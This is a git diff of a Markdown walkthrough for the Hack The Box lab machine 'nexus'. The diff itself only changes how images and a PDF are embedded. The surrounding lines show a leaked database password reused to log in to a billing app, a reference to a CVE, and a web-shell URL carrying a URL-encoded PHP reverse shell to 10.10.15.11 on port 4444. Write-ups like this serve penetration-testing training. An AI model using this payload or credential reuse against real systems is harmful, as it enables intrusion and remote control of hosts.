@@ -140,7 +140,7 @@ Found a password:
 DB_PASSWORD=N27xh!!2ucY04
 ```
 Go to **billing.nexus.htb** and use the creds `j.matthew@nexus.htb:N27xh!!2ucY04` to login, found version `2.2.0`, found [CVE-2026-38526](https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md)
-![[Pasted image 20260628103908.png]]
+![Pasted image](../../../screenshots/Pasted_image_20260628103908.png)
 Get reverse shell through
 ```
 http://billing.nexus.htb/storage/tinymce/16df7148457c63d5b6d7785b79c79010.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.10.15.11%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
@@ -267,7 +267,7 @@ jones@nexus:~$ cat user.txt
 jones@nexus:~$ 
 ```
 ## Get root flag
-![[nexus.pdf]]
+[nexus.pdf](../../../screenshots/nexus.pdf)
 
 
 Achievement: https://labs.hackthebox.com/achievement/machine/2924947/948
